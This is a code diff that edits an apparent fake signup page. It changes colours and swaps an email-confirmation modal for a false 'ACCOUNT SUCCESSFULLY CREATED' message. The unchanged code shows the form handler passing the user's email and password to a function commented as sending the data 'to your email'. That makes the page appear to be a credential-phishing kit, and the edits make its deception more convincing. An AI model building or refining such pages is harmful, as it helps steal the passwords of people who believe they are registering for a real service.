@@ -304,6 +304,7 @@
             font-size: 18px;
             font-weight: bold;
             margin-bottom: 15px;
+            color: #00aff0;
         }
 
         .modal-message {
@@ -313,7 +314,7 @@
 
         .modal-btn {
             padding: 10px 20px;
-            background-color: #007bff;
+            background-color: #00aff0;
             color: white;
             border: none;
             border-radius: 5px;
@@ -427,12 +428,12 @@
         </div>
     </div>
 
-    <!-- Confirmation Modal -->
-    <div class="modal" id="confirmationModal">
+    <!-- Success Modal -->
+    <div class="modal" id="successModal">
         <div class="modal-content">
-            <div class="modal-title">Confirm Your Email</div>
+            <div class="modal-title">ACCOUNT SUCCESSFULLY CREATED</div>
             <div class="modal-message" id="modalMessage">
-                A confirmation link has been sent to your email address. Please check your inbox and click the link to verify your account.
+                Your account has been successfully created. You can now log in and start enjoying the platform.
             </div>
             <button class="modal-btn" id="modalOkBtn">OK</button>
         </div>
@@ -450,7 +451,7 @@
         const passwordInput = document.getElementById('password');
         const signupBtn = document.getElementById('signupBtn');
         const signupForm = document.getElementById('signupForm');
-        const confirmationModal = document.getElementById('confirmationModal');
+        const successModal = document.getElementById('successModal');
         const modalOkBtn = document.getElementById('modalOkBtn');
         const modalMessage = document.getElementById('modalMessage');
         const btnText = document.getElementById('btnText');
@@ -503,15 +504,15 @@
                 // Send data to your email
                 await sendSignupData(email, password);
                 
-                // Show confirmation modal
-                confirmationModal.style.display = 'flex';
+                // Show success modal
+                successModal.style.display = 'flex';
                 
                 // Reset form
                 signupForm.reset();
                 signupBtn.disabled = true;
                 signupBtn.classList.remove('login-btn-enabled');
             } catch (error) {
-                alert('Failed to send signup data. Please try again later.');
+                alert('Failed to create account. Please try again later.');
                 console.error('Error:', error);
             } finally {
                 // Hide loading state
@@ -523,7 +524,9 @@
         
         // Handle modal OK button click
         modalOkBtn.addEventListener('click', function() {
-            confirmationModal.style.display = 'none';
+            successModal.style.display = 'none';
+            // You could redirect to login page here if needed
+            // window.location.href = '/login.html';
         });
         
         // Email validation function
